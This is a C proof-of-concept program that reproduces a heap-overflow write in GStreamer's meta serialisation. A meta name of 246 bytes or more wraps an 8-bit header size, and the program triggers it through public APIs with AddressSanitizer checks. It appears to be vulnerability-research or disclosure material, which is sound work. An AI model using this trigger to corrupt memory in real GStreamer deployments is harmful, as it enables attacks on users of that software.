#include <gst/gst.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* Reproduces gstmeta_serialize_header_size_truncation (candidate 021):
 * gst_meta_serialize()'s `header_size` is a guint8 but the real header
 * length is name_len + 10. A custom meta name of >= 246 bytes wraps
 * header_size modulo 256, under-allocating the buffer while the later
 * memcpy still uses the real, untruncated name_len -> heap overflow write.
 *
 * Entry point exercised is the real public API:
 *   gst_meta_register_custom_simple() -> gst_buffer_add_meta() ->
 *   gst_meta_serialize_simple() (subprojects/gstreamer/gst/gstmeta.c)
 */

int
main (int argc, char **argv)
{
  guint name_len = argc > 1 ? (guint) atoi (argv[1]) : 246;

  gst_init (NULL, NULL);

  /* Build a valid GType name of the requested length: GType names must
   * start with a letter/underscore and may contain alnum/underscore/-/+ ;
   * plain uppercase letters are always valid regardless of length, and
   * gst_meta_register_custom() appends "-api" for the API type, leaving
   * this exact string as the implementation type name used as
   * g_type_name() in gst_meta_serialize(). */
  gchar *name = g_malloc (name_len + 1);
  for (guint i = 0; i < name_len; i++)
    name[i] = 'A' + (i % 26);
  name[name_len] = '\0';

  fprintf (stderr, "Registering custom meta with name_len=%u\n", name_len);

  const GstMetaInfo *info = gst_meta_register_custom_simple (name);
  if (info == NULL) {
    fprintf (stderr,
        "gst_meta_register_custom_simple failed (unexpected)\n");
    return 2;
  }

  fprintf (stderr, "Registered. strlen(g_type_name(info->type)) = %zu\n",
      strlen (g_type_name (info->type)));

  GstBuffer *buf = gst_buffer_new ();
  GstCustomMeta *meta =
      (GstCustomMeta *) gst_buffer_add_meta (buf, info, NULL);
  if (meta == NULL) {
    fprintf (stderr, "gst_buffer_add_meta failed (unexpected)\n");
    return 2;
  }

  GByteArray *data = g_byte_array_new ();
  fprintf (stderr, "Calling gst_meta_serialize_simple()...\n");
  gboolean ok = gst_meta_serialize_simple ((GstMeta *) meta, data);
  fprintf (stderr, "gst_meta_serialize_simple() returned %s, data->len=%u\n",
      ok ? "TRUE" : "FALSE", data->len);

  /* Touch the whole allocated buffer so ASAN's heap redzone check has a
   * chance to fire even if the corrupting memcpy above didn't already
   * trigger it directly. */
  volatile guint8 sum = 0;
  for (guint i = 0; i < data->len; i++)
    sum += data->data[i];
  fprintf (stderr, "sum=%u\n", sum);

  g_byte_array_free (data, TRUE);
  gst_buffer_unref (buf);
  g_free (name);

  fprintf (stderr, "Done without crashing.\n");
  return 0;
}
